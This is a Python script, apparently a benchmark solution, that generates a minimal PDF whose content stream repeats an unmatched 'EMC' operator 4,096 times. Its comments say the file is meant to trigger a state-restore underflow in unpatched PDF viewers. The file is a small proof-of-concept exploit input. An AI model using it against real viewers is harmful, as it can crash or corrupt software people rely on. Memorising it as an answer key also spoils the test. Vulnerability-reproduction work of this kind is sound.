import os
from typing import List


class Solution:
    def solve(self, src_path: str) -> bytes:
        def build_pdf(content: bytes) -> bytes:
            header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
            objects: List[bytes] = []

            # 1 0 obj - Catalog
            obj1 = b"<< /Type /Catalog /Pages 2 0 R >>"
            objects.append(obj1)

            # 2 0 obj - Pages
            obj2 = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
            objects.append(obj2)

            # 3 0 obj - Page
            obj3 = (
                b"<< /Type /Page /Parent 2 0 R "
                b"/MediaBox [0 0 300 300] "
                b"/Resources <<>> "
                b"/Contents 4 0 R >>"
            )
            objects.append(obj3)

            # 4 0 obj - Contents stream
            length_str = str(len(content)).encode("ascii")
            obj4 = b"<< /Length " + length_str + b" >>\nstream\n" + content + b"endstream\n"
            objects.append(obj4)

            out = bytearray()
            out.extend(header)
            offsets = [0]  # xref entry 0 (free)
            for i, obj in enumerate(objects, start=1):
                offsets.append(len(out))
                out.extend(f"{i} 0 obj\n".encode("ascii"))
                out.extend(obj)
                out.extend(b"endobj\n")

            xref_offset = len(out)
            count = len(offsets)
            out.extend(f"xref\n0 {count}\n".encode("ascii"))
            out.extend(b"0000000000 65535 f \n")
            for off in offsets[1:]:
                out.extend(f"{off:010d} 00000 n \n".encode("ascii"))

            trailer = b"<< /Root 1 0 R /Size " + str(count).encode("ascii") + b" >>\n"
            out.extend(b"trailer\n")
            out.extend(trailer)
            out.extend(b"startxref\n")
            out.extend(str(xref_offset).encode("ascii") + b"\n")
            out.extend(b"%%EOF\n")
            return bytes(out)

        # Construct content with multiple unmatched EMC operators to trigger the viewer state restore
        # without a corresponding push. This should be benign on fixed versions that add the depth check.
        # Keep the file modest in size while ensuring the operator is processed.
        emc_repetitions = 4096
        content = (b"EMC\n") * emc_repetitions

        return build_pdf(content)